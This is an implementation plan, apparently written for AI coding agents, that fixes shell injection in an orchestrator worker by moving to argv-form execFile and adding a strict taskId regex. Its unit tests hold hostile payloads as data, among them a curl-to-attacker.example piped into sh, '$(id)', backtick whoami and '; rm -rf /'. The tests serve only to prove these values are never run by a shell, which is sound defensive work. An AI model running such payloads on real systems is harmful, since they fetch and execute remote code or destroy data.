# INT-1483 — Orchestrator Shell Injection Fix Implementation Plan

> **For agentic workers:** REQUIRED SUB-SKILL: Use superpowers:subagent-driven-development (recommended) or superpowers:executing-plans to implement this plan task-by-task. Steps use checkbox (`- [ ]`) syntax for tracking.

**Goal:** Eliminate shell injection in the orchestrator worker by replacing every `exec`/`execSync` call that interpolates untrusted strings with `execFile`/`execFileSync`, and lock down `taskId` shape with a regex validator.

**Architecture:** The orchestrator currently passes LLM/user-controlled values (branch names, filenames, taskIds, repo paths) directly into shell command strings. We replace these call sites with array-form `execFile`/`execFileSync` so arguments are passed via `argv` and never interpreted by `/bin/sh`. We also tighten the `CreateTaskRequestSchema.taskId` to `/^task_[0-9a-f-]{36}$/` so that even when a downstream callsite forgets to use `execFile`, no shell metacharacter can reach it. A small audit pass covers `worktree-manager.ts` for the same anti-pattern.

**Tech Stack:** Node.js `child_process` (`execFile` / `execFileSync` from `node:child_process`), `util.promisify`, Zod, Vitest.

---

## Endpoint Changes

- **Modified:** None (no HTTP route surface change).
- **Created:** None.
- **Removed:** None.
- **Unchanged:** All `/internal/*` and `POST /tasks*` endpoints. Behavior is unchanged for valid inputs; previously-accepted but malformed `taskId` values (e.g. `task_abc`) will now be rejected by the schema.

## Files Touched

- Modify: `workers/orchestrator/src/services/sensitive-file-guard.ts`
- Modify: `workers/orchestrator/src/__tests__/sensitive-file-guard.test.ts`
- Modify: `workers/orchestrator/src/services/task-dispatcher/webhook-callbacks.ts`
- Modify: `workers/orchestrator/src/__tests__/services/task-dispatcher/webhook-callbacks.test.ts`
- Modify: `workers/orchestrator/src/bootstrap/git-identity.ts`
- Create: `workers/orchestrator/src/__tests__/bootstrap/git-identity.test.ts`
- Modify: `workers/orchestrator/src/types/schemas.ts`
- Create: `workers/orchestrator/src/__tests__/types/schemas-taskid.test.ts`
- Modify: `workers/orchestrator/src/services/worktree-manager.ts`
- Modify: `workers/orchestrator/src/__tests__/worktree-manager.test.ts`

Each file has one clear responsibility:
- `sensitive-file-guard.ts` — revert sensitive files using `execFileSync` with array args.
- `webhook-callbacks.ts` — `gh`/`git`/`cat` calls split into argv arrays, with a `CheckForResultExecFile` injection type for tests.
- `git-identity.ts` — `execFileSync` with array args; `repoPath` validated as absolute path.
- `schemas.ts` — strict `taskId` regex on the request schema.
- `worktree-manager.ts` — same `execFile` migration for the LLM/user-controlled `taskId`, `baseBranch`, `continuationPrBranch`, `worktreePath` paths.

## Audit Boundary

This plan is **scoped to the orchestrator worker only**. No other services consume these symbols. The plan deliberately does NOT touch:
- `bootstrap/secret-manager.ts` and `bootstrap/gcp-validator.ts` — they already use injected `execSync` with values controlled by the orchestrator's own config (no untrusted input flows in).
- `start.ts:88` — `git rev-parse --short HEAD`, no interpolation.
- Worker container `Dockerfile`/`docker-container.ts` — already uses `dockerode`'s `container.exec({Cmd: [...]})` argv form.

If a future audit finds an additional `exec`/`execSync` site that interpolates untrusted input, file a follow-up issue rather than expanding this plan.

## Acceptance Criteria

1. No `exec(...)` or `execSync(...)` call in `workers/orchestrator/src/**` interpolates an LLM/user-controlled string into a shell command. All such call sites use `execFile`/`execFileSync` with argv arrays.
2. `CreateTaskRequestSchema.taskId` rejects any value that does not match `/^task_[0-9a-f-]{36}$/` (case-insensitive). The error path returns 400 from POST `/tasks`.
3. Every replaced call site has a unit test that proves a shell metacharacter payload (e.g. `; curl evil`, `$(id)`, backticks) is passed *as a literal argv element*, NOT interpreted by a shell.
4. `pnpm run verify:workspace:tracked -- orchestrator` passes (build, lint, test, 95% coverage).
5. `pnpm run ci:tracked` passes from repo root.
6. The exec/execSync replacement is regression-tested: existing happy-path tests for sensitive-file-guard, webhook-callbacks, and worktree-manager still pass with the new argv shape.

## Test Plan

- **Negative shell-metacharacter tests** for each fixed call site. Pass payloads like:
  - `'"; curl http://attacker.example | sh; echo "'`
  - `'$(id)'`
  - `'`whoami`'`
  - `'..; rm -rf /'`
  Verify the spawned process receives the literal string as one argv element, not as a shell-parsed expression. Implement by inspecting the captured args of the injected `execFile` fake.
- **Schema unit tests** for `taskId` regex: accept `task_<32 hex with dashes>`, reject empty, missing prefix, wrong length, capital letters with non-hex chars, and embedded shell metacharacters.
- **Integration regression**: existing happy-path tests for sensitive-file-guard, webhook-callbacks, worktree-manager keep passing — they get migrated to the new exec-shape (argv) but assert the same observable behavior.
- **Manual smoke**: after merge, `pm2 restart orchestrator` in dev and verify a normal task lifecycle (create → run → PR → completion) still works end-to-end against a real repo.

---

## Task 1: Tighten `taskId` Regex on `CreateTaskRequestSchema`

**Files:**
- Modify: `workers/orchestrator/src/types/schemas.ts`
- Create: `workers/orchestrator/src/__tests__/types/schemas-taskid.test.ts`

- [ ] **Step 1: Write the failing test**

Create `workers/orchestrator/src/__tests__/types/schemas-taskid.test.ts`:

```ts
import { describe, expect, it } from 'vitest';
import { CreateTaskRequestSchema } from '../../types/schemas.js';

const baseRequest = {
  workerType: 'opus',
  prompt: 'do work',
  webhookUrl: 'https://example.com/hook',
  webhookSecret: 'secret',
} as const;

describe('CreateTaskRequestSchema.taskId', () => {
  const valid = 'task_0ba004f8-253e-4110-be10-9856b959d3f1';

  it('accepts a canonical task UUID', () => {
    const result = CreateTaskRequestSchema.safeParse({ ...baseRequest, taskId: valid });
    expect(result.success).toBe(true);
  });

  it('rejects empty string', () => {
    const result = CreateTaskRequestSchema.safeParse({ ...baseRequest, taskId: '' });
    expect(result.success).toBe(false);
  });

  it('rejects missing task_ prefix', () => {
    const result = CreateTaskRequestSchema.safeParse({
      ...baseRequest,
      taskId: '0ba004f8-253e-4110-be10-9856b959d3f1',
    });
    expect(result.success).toBe(false);
  });

  it('rejects wrong-length UUID', () => {
    const result = CreateTaskRequestSchema.safeParse({ ...baseRequest, taskId: 'task_deadbeef' });
    expect(result.success).toBe(false);
  });

  it('rejects shell metacharacters', () => {
    const result = CreateTaskRequestSchema.safeParse({
      ...baseRequest,
      taskId: 'task_0ba004f8-253e-4110-be10-9856b959d3f1; rm -rf /',
    });
    expect(result.success).toBe(false);
  });

  it('rejects backtick injection', () => {
    const result = CreateTaskRequestSchema.safeParse({
      ...baseRequest,
      taskId: 'task_`id`-253e-4110-be10-9856b959d3f1',
    });
    expect(result.success).toBe(false);
  });

  it('accepts uppercase hex (canonical Linear shape is lowercase, be permissive on case but strict on charset)', () => {
    const result = CreateTaskRequestSchema.safeParse({
      ...baseRequest,
      taskId: 'task_0BA004F8-253E-4110-BE10-9856B959D3F1',
    });
    expect(result.success).toBe(true);
  });
});
```

- [ ] **Step 2: Run test to verify it fails**

Run: `pnpm --filter @intexuraos/orchestrator test -- schemas-taskid`
Expected: FAIL — at minimum the "rejects shell metacharacters" test fails because the current regex is `z.string().min(1)`.

- [ ] **Step 3: Implement minimal fix**

Edit `workers/orchestrator/src/types/schemas.ts` line 53:

```ts
// Before:
//   taskId: z.string().min(1),
// After:
taskId: z.string().regex(/^task_[0-9a-f-]{36}$/i, 'taskId must match /^task_[0-9a-f-]{36}$/'),
```

- [ ] **Step 4: Run tests to verify all pass**

Run: `pnpm --filter @intexuraos/orchestrator test -- schemas-taskid`
Expected: PASS (7 tests).

- [ ] **Step 5: Verify no callsite passes an invalid taskId in existing tests**

Run: `pnpm --filter @intexuraos/orchestrator test`
Expected: ALL existing tests still pass. If any test fixture uses a non-canonical taskId (e.g. `task_abc`), update the fixture to a valid `task_<UUID>` shape — do NOT loosen the regex.

- [ ] **Step 6: Commit**

```bash
git add workers/orchestrator/src/types/schemas.ts workers/orchestrator/src/__tests__/types/schemas-taskid.test.ts
git commit -m "fix(orchestrator): enforce strict taskId regex on CreateTaskRequestSchema (INT-1483)"
```

---

## Task 2: Replace `execSync` with `execFileSync` in `SensitiveFileGuard`

**Files:**
- Modify: `workers/orchestrator/src/services/sensitive-file-guard.ts`
- Modify: `workers/orchestrator/src/__tests__/sensitive-file-guard.test.ts`

- [ ] **Step 1: Write the failing injection test**

Append to `workers/orchestrator/src/__tests__/sensitive-file-guard.test.ts` inside the `checkAndRevert` describe:

```ts
it('passes filenames containing shell metacharacters as literal argv (no shell expansion)', async () => {
  const guard = new SensitiveFileGuard(mockLogger);
  // Filename that would execute `id` if interpolated into a shell.
  const evil = '$(id).env';
  mockExecFileSync.mockImplementation((file, args) => {
    if (file === 'git' && Array.isArray(args) && args.includes('diff')) {
      return `${evil}\n`;
    }
    return '';
  });

  await guard.checkAndRevert('/path/to/worktree', 1);

  // The checkout call must receive the evil filename as a literal argv element,
  // not as part of a shell-interpreted command string.
  expect(mockExecFileSync).toHaveBeenCalledWith(
    'git',
    ['checkout', 'HEAD~1', '--', evil],
    { cwd: '/path/to/worktree' },
  );
});

it('passes commitCount as numeric ref, not interpolated', async () => {
  const guard = new SensitiveFileGuard(mockLogger);
  mockExecFileSync.mockReturnValue('.env\n');
  await guard.checkAndRevert('/path/to/worktree', 5);
  expect(mockExecFileSync).toHaveBeenCalledWith(
    'git',
    ['diff', '--name-only', 'HEAD~5', 'HEAD'],
    { cwd: '/path/to/worktree', encoding: 'utf-8' },
  );
});
```

Update the existing `vi.mock` block so `execFileSync` is exposed alongside the existing `execSync` (keep `execSync` until source migration is done in Step 3 — both mocks coexist for one commit boundary, then we drop `execSync` from the mock):

```ts
const mockExecSync = vi.fn();
const mockExecFileSync = vi.fn();

vi.mock('node:child_process', () => ({
  execSync: mockExecSync,
  execFileSync: mockExecFileSync,
}));
```

In `beforeEach`, also reset `mockExecFileSync.mockReset()`.

- [ ] **Step 2: Run tests to verify the new tests fail**

Run: `pnpm --filter @intexuraos/orchestrator test -- sensitive-file-guard`
Expected: 2 new tests FAIL because the source still uses `execSync` with shell strings.

- [ ] **Step 3: Replace `execSync` with `execFileSync` in `sensitive-file-guard.ts`**

Edit `workers/orchestrator/src/services/sensitive-file-guard.ts`. Replace the `checkAndRevert` body:

```ts
async checkAndRevert(worktreePath: string, commitCount: number): Promise<GuardResult> {
  const { execFileSync } = await import('node:child_process');

  const baseRef = `HEAD~${String(commitCount)}`;

  // Get changed files in this commit range. `git diff` accepts `HEAD~N` as a single
  // revision token; we pass it as one argv element so no shell parses it.
  const result = execFileSync('git', ['diff', '--name-only', baseRef, 'HEAD'], {
    cwd: worktreePath,
    encoding: 'utf-8',
  });

  const changedFiles = result.trim().split('\n').filter(Boolean);

  const reverted: string[] = [];
  const remaining: string[] = [];

  for (const file of changedFiles) {
    if (this.isSensitive(file)) {
      try {
        // `--` separates revisions from pathspecs; `file` is a literal argv element.
        execFileSync('git', ['checkout', baseRef, '--', file], { cwd: worktreePath });
        reverted.push(file);
      } catch (error) {
        this.logger.error({ file, error }, 'Failed to revert sensitive file');
        remaining.push(file);
      }
    } else {
      remaining.push(file);
    }
  }

  return {
    reverted,
    remaining,
    allSensitive: remaining.length === 0 && reverted.length > 0,
  };
}
```

- [ ] **Step 4: Update existing tests to use `mockExecFileSync`**

In `sensitive-file-guard.test.ts`, replace every `mockExecSync.mockReturnValue(...)`, `mockExecSync.mockImplementation(...)` and `expect(mockExecSync).toHaveBeenCalledWith(...)` to use `mockExecFileSync`. Update the assertion shape from string command to (file, argv, options). Example replacements:

```ts
// Before:
expect(mockExecSync).toHaveBeenCalledWith('git diff --name-only HEAD~1 HEAD', {
  cwd: '/path/to/worktree',
  encoding: 'utf-8',
});
// After:
expect(mockExecFileSync).toHaveBeenCalledWith(
  'git',
  ['diff', '--name-only', 'HEAD~1', 'HEAD'],
  { cwd: '/path/to/worktree', encoding: 'utf-8' },
);

// Before:
expect(mockExecSync).toHaveBeenCalledWith('git checkout HEAD~1 -- ".env"', {
  cwd: '/path/to/worktree',
});
// After:
expect(mockExecFileSync).toHaveBeenCalledWith(
  'git',
  ['checkout', 'HEAD~1', '--', '.env'],
  { cwd: '/path/to/worktree' },
);
```

For `mockImplementation` callbacks that branched on `command.includes('git diff')`, switch to `args.includes('diff')` / `args.includes('checkout')`. Example:

```ts
mockExecFileSync.mockImplementation((file, args) => {
  if (file === 'git' && Array.isArray(args) && args.includes('diff')) {
    return '.env\nsrc/index.ts\ncredentials.json\n';
  }
  return '';
});
```

Remove `mockExecSync` declaration and from the `vi.mock` block — only `execFileSync` is needed.

- [ ] **Step 5: Run all sensitive-file-guard tests**

Run: `pnpm --filter @intexuraos/orchestrator test -- sensitive-file-guard`
Expected: ALL tests PASS (existing + the 2 new injection tests).

- [ ] **Step 6: Commit**

```bash
git add workers/orchestrator/src/services/sensitive-file-guard.ts \
        workers/orchestrator/src/__tests__/sensitive-file-guard.test.ts
git commit -m "fix(orchestrator): use execFileSync in SensitiveFileGuard to prevent shell injection (INT-1483)"
```

---

## Task 3: Replace `exec` with `execFile` in `webhook-callbacks.checkForResult`

**Files:**
- Modify: `workers/orchestrator/src/services/task-dispatcher/webhook-callbacks.ts`
- Modify: `workers/orchestrator/src/__tests__/services/task-dispatcher/webhook-callbacks.test.ts`

This is the highest-risk callsite — `currentBranch` comes from `git branch --show-current` of an LLM-controlled worktree.

- [ ] **Step 1: Write the failing injection test**

Append to `workers/orchestrator/src/__tests__/services/task-dispatcher/webhook-callbacks.test.ts`:

```ts
it('passes attacker-controlled branch name as literal argv to gh pr list (no shell expansion)', async () => {
  const evilBranch = '"; curl http://attacker.example | sh; echo "';
  const calls: { file: string; args: readonly string[] }[] = [];

  const fakeExecFile: CheckForResultExecFile = async (file, args, _options) => {
    calls.push({ file, args });
    if (file === 'git' && args[0] === 'branch' && args[1] === '--show-current') {
      return { stdout: `${evilBranch}\n` };
    }
    if (file === 'gh' && args[0] === 'pr' && args[1] === 'list') {
      return { stdout: '[]' };
    }
    if (file === 'cat') {
      return { stdout: '{}' };
    }
    return { stdout: '' };
  };

  // ... use existing checkForResult harness in this file, passing fakeExecFile
  await checkForResult(/* …existing args… */, fakeExecFile);

  const ghCall = calls.find((c) => c.file === 'gh');
  expect(ghCall).toBeDefined();
  // The malicious branch must be a literal element in argv, never concatenated into one string.
  expect(ghCall?.args).toEqual([
    'pr', 'list', '--head', evilBranch, '--json', 'url,number,headRefName,title,commits', '--jq', '.',
  ]);
});
```

NOTE: copy the existing test harness setup (Task, logger, webhookClient stubs) from a neighboring test in the same file. Re-use the same fake-builders — do not invent a new test scaffold.

- [ ] **Step 2: Run test to verify it fails**

Run: `pnpm --filter @intexuraos/orchestrator test -- webhook-callbacks`
Expected: FAIL — `CheckForResultExecFile` type does not exist yet.

- [ ] **Step 3: Add the new injection type and migrate `checkForResult`**

Edit `workers/orchestrator/src/services/task-dispatcher/webhook-callbacks.ts`:

1. Replace the imports at the top:

```ts
import { exec, execFile } from 'node:child_process';
import { promisify } from 'node:util';
// …existing imports unchanged…
const execFileAsync = promisify(execFile);
```

Drop `const execAsync = promisify(exec);` if no longer referenced (it should not be once Step 4 below is done).

2. Add the new injection type next to (or replacing) `CheckForResultExec`:

```ts
/**
 * Shape of the `execFile` helper used inside `checkForResult`. Argv-form spawn
 * (no `/bin/sh`) — every untrusted value (branch name, PR number, file path)
 * is a literal argv element and cannot be re-interpreted by a shell.
 */
export type CheckForResultExecFile = (
  file: string,
  args: readonly string[],
  options: { cwd: string }
) => Promise<{ stdout: string }>;
```

Mark `CheckForResultExec` as `@deprecated` and remove all internal references in Step 4.

3. Update the `checkForResult` signature default to `execFileAsync`:

```ts
export async function checkForResult(
  task: Task,
  workingDir: string,
  logger: Logger,
  execFileFn: CheckForResultExecFile = execFileAsync as unknown as CheckForResultExecFile,
): Promise<TaskResult | undefined> {
  const execOptions = { cwd: workingDir };
  // …
}
```

(If `checkForResult` currently has more params, keep them — only the exec injection slot changes.)

4. Replace each call site. Concrete mappings:

```ts
// L302 — gh pr view <continuationPrNumber> --json … --jq .
const { stdout: prOutput } = await execFileFn(
  'gh',
  ['pr', 'view', String(task.continuationPrNumber), '--json', 'url,number,headRefName,title,state,mergedAt', '--jq', '.'],
  execOptions,
);

// L318 / L365 — `cat .rebase-result.json 2>/dev/null || echo "{}"`
// Replace shell-or-fallback with explicit fs.readFile + try/catch:
import { readFile } from 'node:fs/promises';
// …
let rebaseOutput = '{}';
try {
  rebaseOutput = await readFile(`${workingDir}/.rebase-result.json`, 'utf8');
} catch {
  rebaseOutput = '{}';
}
const rebaseResult = parseRebaseResultOutput(rebaseOutput, task.taskId, logger);

// L336 — git branch --show-current
const { stdout: branchOutput } = await execFileFn(
  'git',
  ['branch', '--show-current'],
  execOptions,
);

// L340 — gh pr list --head "${currentBranch}" --json … --jq .
const { stdout: prOutput } = await execFileFn(
  'gh',
  ['pr', 'list', '--head', currentBranch, '--json', 'url,number,headRefName,title,commits', '--jq', '.'],
  execOptions,
);
```

5. Remove the now-unused `CheckForResultExec` export, OR keep it but stop using it internally — preserve only one injection type (`CheckForResultExecFile`). Update the JSDoc on the function accordingly.

- [ ] **Step 4: Update all existing tests to use `CheckForResultExecFile`**

In `webhook-callbacks.test.ts`, every place that constructed a `CheckForResultExec` fake (matching on `command` string) needs to switch to `(file, args, options)` matching. Concrete edit: search for callbacks of the form `(command: string, _options) => ...` and rewrite them as `(file: string, args: readonly string[], _options) => ...` with conditions like `file === 'gh' && args[0] === 'pr' && args[1] === 'list'`.

Replace any `cat .rebase-result.json` exec stubbing with a `fs.readFile` mock — use `vi.mock('node:fs/promises', …)` or inject a `readRebaseFile` dependency if the function shape allows. Pick whichever change is smaller; if neither is small, add an injectable `readRebaseFile?: (path: string) => Promise<string>` parameter to `checkForResult` with a default of `(path) => readFile(path, 'utf8')`. If you choose the injectable, document it as the test seam in the function JSDoc.

- [ ] **Step 5: Run all webhook-callbacks tests**

Run: `pnpm --filter @intexuraos/orchestrator test -- webhook-callbacks`
Expected: ALL tests PASS, including the new injection assertion.

- [ ] **Step 6: Verify `execAsync` is fully removed from this module**

Run: `pnpm --filter @intexuraos/orchestrator exec rg "execAsync|exec\\(" src/services/task-dispatcher/webhook-callbacks.ts`
Expected: no matches (the `exec` import and `execAsync` constant are gone; only `execFile` / `execFileAsync` remain).

- [ ] **Step 7: Commit**

```bash
git add workers/orchestrator/src/services/task-dispatcher/webhook-callbacks.ts \
        workers/orchestrator/src/__tests__/services/task-dispatcher/webhook-callbacks.test.ts
git commit -m "fix(orchestrator): use execFile + fs.readFile in checkForResult to prevent shell injection (INT-1483)"
```

---

## Task 4: Replace `execSync` with `execFileSync` in `git-identity.ts`

**Files:**
- Modify: `workers/orchestrator/src/bootstrap/git-identity.ts`
- Create: `workers/orchestrator/src/__tests__/bootstrap/git-identity.test.ts`

This module is exported and the issue calls it out as "fragile to future misuse". We pass `repoPath` and `key` as argv elements and add a guard that `repoPath` is an absolute path (cheap defense-in-depth — a relative `../../etc/passwd` would still be an argv element but is meaningless to `git -C`).

- [ ] **Step 1: Write the failing injection test**

Create `workers/orchestrator/src/__tests__/bootstrap/git-identity.test.ts`:

```ts
import { describe, expect, it, vi } from 'vitest';

const mockExecFileSync = vi.fn();
vi.mock('node:child_process', () => ({
  execFileSync: mockExecFileSync,
}));

import { readHostGitConfig, readRepoGitConfig } from '../../bootstrap/git-identity.js';

describe('git-identity', () => {
  it('readHostGitConfig passes key as literal argv element', () => {
    mockExecFileSync.mockReturnValue('Alice\n');
    expect(readHostGitConfig('user.name')).toBe('Alice');
    expect(mockExecFileSync).toHaveBeenCalledWith(
      'git',
      ['config', 'user.name'],
      expect.objectContaining({ encoding: 'utf-8' }),
    );
  });

  it('readHostGitConfig returns undefined when execFileSync throws', () => {
    mockExecFileSync.mockImplementationOnce(() => {
      throw new Error('git not found');
    });
    expect(readHostGitConfig('user.name')).toBeUndefined();
  });

  it('readRepoGitConfig passes repoPath and key as literal argv elements (no shell)', () => {
    mockExecFileSync.mockReturnValue('alice@example.com\n');
    expect(readRepoGitConfig('/repo', 'user.email')).toBe('alice@example.com');
    expect(mockExecFileSync).toHaveBeenCalledWith(
      'git',
      ['-C', '/repo', 'config', '--local', 'user.email'],
      expect.objectContaining({ encoding: 'utf-8' }),
    );
  });

  it('readRepoGitConfig rejects relative repoPath (defense-in-depth)', () => {
    expect(readRepoGitConfig('../etc/passwd', 'user.email')).toBeUndefined();
    expect(mockExecFileSync).not.toHaveBeenCalled();
  });

  it('readRepoGitConfig passes a key containing shell metacharacters as literal argv', () => {
    mockExecFileSync.mockReturnValue('');
    // No shell parses the `;` — git will simply error out, which we swallow as undefined.
    mockExecFileSync.mockImplementationOnce(() => {
      throw new Error('unknown config key');
    });
    expect(readRepoGitConfig('/repo', 'user.name; rm -rf /')).toBeUndefined();
    expect(mockExecFileSync).toHaveBeenCalledWith(
      'git',
      ['-C', '/repo', 'config', '--local', 'user.name; rm -rf /'],
      expect.any(Object),
    );
  });
});
```

- [ ] **Step 2: Run test to verify it fails**

Run: `pnpm --filter @intexuraos/orchestrator test -- bootstrap/git-identity`
Expected: FAIL — module still uses `execSync` and the test file's mock targets `execFileSync`.

- [ ] **Step 3: Replace `execSync` with `execFileSync` in `git-identity.ts`**

Replace the file contents with:

```ts
/**
 * Git identity resolution for worker containers.
 *
 * Precedence (highest wins):
 *   1. Env var override (`INTEXURAOS_GIT_USER_NAME`, `INTEXURAOS_GIT_USER_EMAIL`)
 *   2. Host global git config (`git config user.name`, etc.)
 *   3. Undefined (workers inherit nothing)
 *
 * Repo-level (`--local`) config takes precedence over everything in a
 * worktree — {@link readRepoGitConfig} surfaces it so callers can warn.
 *
 * SECURITY: Both helpers shell out via `execFileSync` (argv form, no `/bin/sh`)
 * so callers cannot accidentally inject shell metacharacters via `key` or
 * `repoPath`. `repoPath` is additionally constrained to absolute paths.
 */

import { execFileSync } from 'node:child_process';
import { isAbsolute } from 'node:path';

const GIT_CONFIG_TIMEOUT_MS = 5000;

export function readHostGitConfig(key: string): string | undefined {
  try {
    const value = execFileSync('git', ['config', key], {
      encoding: 'utf-8',
      timeout: GIT_CONFIG_TIMEOUT_MS,
    }).trim();
    return value !== '' ? value : undefined;
  } catch {
    return undefined;
  }
}

export function readRepoGitConfig(repoPath: string, key: string): string | undefined {
  if (!isAbsolute(repoPath)) {
    return undefined;
  }
  try {
    const value = execFileSync('git', ['-C', repoPath, 'config', '--local', key], {
      encoding: 'utf-8',
      timeout: GIT_CONFIG_TIMEOUT_MS,
    }).trim();
    return value !== '' ? value : undefined;
  } catch {
    return undefined;
  }
}
```

Note: the previous file had `/* v8 ignore */` blocks because the call shelled out at module load. With `execFileSync` injected via `vi.mock` we now have real coverage; remove those v8-ignore directives. If coverage still complains, add `/* v8 ignore <category> -- reason @preserve */` only with a category from `.claude/reference/coverage-exemptions.md` (likely `module-init` is no longer applicable; prefer `module-mock` if needed).

- [ ] **Step 4: Run all git-identity tests**

Run: `pnpm --filter @intexuraos/orchestrator test -- bootstrap/git-identity`
Expected: 5 tests PASS.

- [ ] **Step 5: Run the full orchestrator test suite to catch regressions**

Run: `pnpm --filter @intexuraos/orchestrator test`
Expected: ALL pass.

- [ ] **Step 6: Commit**

```bash
git add workers/orchestrator/src/bootstrap/git-identity.ts \
        workers/orchestrator/src/__tests__/bootstrap/git-identity.test.ts
git commit -m "fix(orchestrator): use execFileSync in git-identity to prevent shell injection (INT-1483)"
```

---

## Task 5: Audit & Migrate `worktree-manager.ts`

**Files:**
- Modify: `workers/orchestrator/src/services/worktree-manager.ts`
- Modify: `workers/orchestrator/src/__tests__/worktree-manager.test.ts`

`worktree-manager.ts` interpolates `taskId`, `baseBranch`, `continuationPrBranch`, and `worktreePath` into shell strings (lines 86, 91, 107–122, 163, 224, 272, 293). Even with the `taskId` regex from Task 1, `baseBranch` and `continuationPrBranch` come from the create-task request and need argv-form spawn.

- [ ] **Step 1: Write the failing injection test**

Append to `workers/orchestrator/src/__tests__/worktree-manager.test.ts` (re-use the existing exec-injection harness — line 35 already shows the test parses `command` strings; we are replacing that harness):

```ts
it('passes baseBranch as literal argv to git fetch (no shell expansion)', async () => {
  const calls: { file: string; args: readonly string[] }[] = [];
  const fakeExecFile = async (file: string, args: readonly string[]) => {
    calls.push({ file, args });
    return { stdout: '', stderr: 'Preparing worktree (new branch)' };
  };
  const manager = new WorktreeManager(
    { repositoryPath: '/repo', worktreeBasePath: '/wt' },
    mockLogger,
    fakeExecFile,
  );
  await manager.createWorktree({
    taskId: 'task_0ba004f8-253e-4110-be10-9856b959d3f1',
    baseBranch: '"; curl evil | sh; echo "',
  });
  const fetchCall = calls.find(
    (c) => c.file === 'git' && c.args[0] === 'fetch' && c.args[1] === 'origin',
  );
  expect(fetchCall?.args).toEqual([
    'fetch', 'origin', '"; curl evil | sh; echo "', '--force',
  ]);
});
```

The exact constructor and method shape may differ — read `worktree-manager.ts` first and adapt. If `WorktreeManager` does not currently accept an exec injection, add an optional constructor argument `execFileFn?: (file: string, args: readonly string[], options: ExecFileOptions) => Promise<{stdout: string; stderr: string}>` defaulting to `promisify(execFile)`.

- [ ] **Step 2: Run test to verify it fails**

Run: `pnpm --filter @intexuraos/orchestrator test -- worktree-manager`
Expected: FAIL — exec injection point doesn't exist or argv shape doesn't match.

- [ ] **Step 3: Migrate every `execAsync` call site in `worktree-manager.ts`**

Concrete mappings (preserve identical behavior — only the wire shape changes):

```ts
// L86 — git fetch origin "${baseBranch}" --force
await execFileFn('git', ['fetch', 'origin', baseBranch, '--force'], { cwd: this.config.repositoryPath });

// L91 — git branch -f "${baseBranch}" "origin/${baseBranch}"
await execFileFn('git', ['branch', '-f', baseBranch, `origin/${baseBranch}`], { cwd: this.config.repositoryPath });

// L107 — git worktree add -b "${taskId}" "${worktreePath}" "origin/${baseBranch}"
({ stderr } = await execFileFn(
  'git',
  ['worktree', 'add', '-b', taskId, worktreePath, `origin/${baseBranch}`],
  { cwd: this.config.repositoryPath },
));

// L114 — git fetch origin "${continuationPrBranch}"
await execFileFn('git', ['fetch', 'origin', continuationPrBranch], { cwd: this.config.repositoryPath });

// L117 — git worktree add -B "${taskId}" "${worktreePath}" "origin/${continuationPrBranch}"
({ stderr } = await execFileFn(
  'git',
  ['worktree', 'add', '-B', taskId, worktreePath, `origin/${continuationPrBranch}`],
  { cwd: this.config.repositoryPath },
));

// L163 — git worktree remove "${worktreePath}" --force
const { stderr } = await execFileFn('git', ['worktree', 'remove', worktreePath, '--force'], { cwd: this.config.repositoryPath });

// L180 / L224 — git worktree list --porcelain (no untrusted args)
const { stdout } = await execFileFn('git', ['worktree', 'list', '--porcelain'], { cwd: this.config.repositoryPath });

// L272 — git worktree repair "${worktreePath}"
const { stderr } = await execFileFn('git', ['worktree', 'repair', worktreePath], { cwd: this.config.repositoryPath });

// L293 — git -C "${worktreePath}" symbolic-ref --quiet HEAD
const { stdout } = await execFileFn('git', ['-C', worktreePath, 'symbolic-ref', '--quiet', 'HEAD'], { cwd: this.config.repositoryPath });
```

NOTE: argv elements that contain a leading `-` could be misread as flags (`--`). For each call site, audit whether any user-controlled arg could start with `-`. For `baseBranch`/`continuationPrBranch`, prepend a `--` separator where git syntax allows (e.g. `git branch -f -- "$baseBranch" "origin/$baseBranch"` is invalid — keep as-is, but rely on the fact that `CreateTaskRequestSchema` already accepts arbitrary strings here). Add a follow-up issue if leading-dash branch names need rejection at the schema level — DO NOT add it in this plan.

- [ ] **Step 4: Update existing worktree-manager tests**

Replace the test harness's regex-on-string matcher (`/git worktree add -[bB] "[^"]*" "([^"]*)"/.exec(command)`) with argv inspection. Concretely, every test that constructs an exec fake of the form `(command: string) => …` becomes `(file: string, args: readonly string[]) => …` and asserts on `args` arrays.

- [ ] **Step 5: Run all worktree-manager tests**

Run: `pnpm --filter @intexuraos/orchestrator test -- worktree-manager`
Expected: ALL pass.

- [ ] **Step 6: Commit**

```bash
git add workers/orchestrator/src/services/worktree-manager.ts \
        workers/orchestrator/src/__tests__/worktree-manager.test.ts
git commit -m "fix(orchestrator): use execFile in WorktreeManager to prevent shell injection (INT-1483)"
```

---

## Task 6: Whole-Workspace Verification

**Files:**
- None modified; this task is purely verification.

- [ ] **Step 1: Run the orchestrator workspace verification**

Run from repo root: `pnpm run verify:workspace:tracked -- orchestrator`
Expected: PASS — build, lint, test, 95% coverage.

If coverage drops on `git-identity.ts` (because we removed `/* v8 ignore */` blocks), inspect `coverage/orchestrator/index.html` and either add a real test (preferred) or a categorized v8-ignore with a precise testing-blocker reason.

- [ ] **Step 2: Run the full repo CI**

Run from repo root: `pnpm run ci:tracked 2>&1 | tee /tmp/ci-int1483.txt`
Expected: PASS across all workspaces. If anything fails outside `workers/orchestrator`, the Commit Gate forbids saying "unrelated to my changes" — investigate and fix.

- [ ] **Step 3: Final grep — ensure no residual shell-form exec with interpolation**

Run: `pnpm exec rg -n 'exec(Sync|Async)?\(`' workers/orchestrator/src`
Read every match and confirm:
- It is `execFile` / `execFileSync` (argv form), OR
- It is a literal string command with no `${...}` interpolation, OR
- It is `dockerode`'s `container.exec({Cmd: [...]})` (already argv form).

If any match shows `${...}` inside a string passed to `exec`/`execSync`, this plan is INCOMPLETE — add the migration to the plan and reopen the task.

- [ ] **Step 4: Push and open PR**

```bash
gh pr create --base development --title "[INT-1483] Fix shell injection in orchestrator worker" --body "<see PR template>"
```

PR body must include:
- `Linear: [INT-1483](https://linear.app/pbuchman/issue/INT-1483)`
- `Fixes INT-1483`
- Endpoint Changes: None
- Decision Log: `taskId` regex enforcement + `worktree-manager.ts` audit added to original scope.

---

## Self-Review Checklist (filled out)

**Spec coverage:**
- ✅ webhook-callbacks.ts:336-343 → Task 3.
- ✅ sensitive-file-guard.ts:58-69 → Task 2.
- ✅ git-identity.ts:25, 42 → Task 4.
- ✅ schemas.ts:53 taskId regex → Task 1.
- ✅ Bonus audit of worktree-manager.ts (same anti-pattern) → Task 5.

**Placeholder scan:** No "TBD"/"add validation"/"similar to Task N" — every step shows code or commands.

